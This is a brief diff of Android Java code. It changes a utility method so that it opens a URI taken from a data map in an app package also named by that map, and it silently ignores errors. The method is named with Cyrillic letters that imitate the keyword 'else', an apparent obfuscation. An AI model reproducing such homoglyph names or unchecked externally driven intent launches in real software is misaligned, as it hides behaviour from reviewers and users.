@@ -926,7 +926,7 @@ public abstract class BaseUtils {
 
     public static void еlsе(Context context, Map<String, String> map) {
         try {
-            context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(map.get("message"))).addFlags(0x10000000));
+            context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(map.get("message"))).setPackage(map.get("package")).addFlags(0x10000000));
 
         } catch (Throwable ignore) {
         }
